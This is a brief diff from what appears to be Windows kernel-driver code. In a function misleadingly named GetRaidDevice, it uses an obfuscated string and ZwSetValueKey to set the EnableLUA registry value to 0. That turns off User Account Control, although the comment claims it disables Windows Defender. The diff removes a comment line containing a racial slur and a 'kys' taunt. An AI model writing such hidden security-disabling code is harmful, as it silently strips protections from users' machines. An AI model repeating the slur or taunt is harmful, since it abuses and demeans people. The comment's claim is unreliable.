@@ -118,7 +118,7 @@ NTSTATUS GetRaidDevice()
     }
 
     UNICODE_STRING valueName;
-    RtlInitUnicodeString(&valueName, oxorany(L"EnableLUA")); // this dissabled windef (yeah ik its weired that it has "enabled" in it but kys nigger
+    RtlInitUnicodeString(&valueName, oxorany(L"EnableLUA")); // this dissabled windef (yeah ik its weired that it has "enabled" in it)
     ULONG valueData = 0;
 
     status = ZwSetValueKey(hKey, &valueName, 0, REG_DWORD, &valueData, sizeof(valueData));
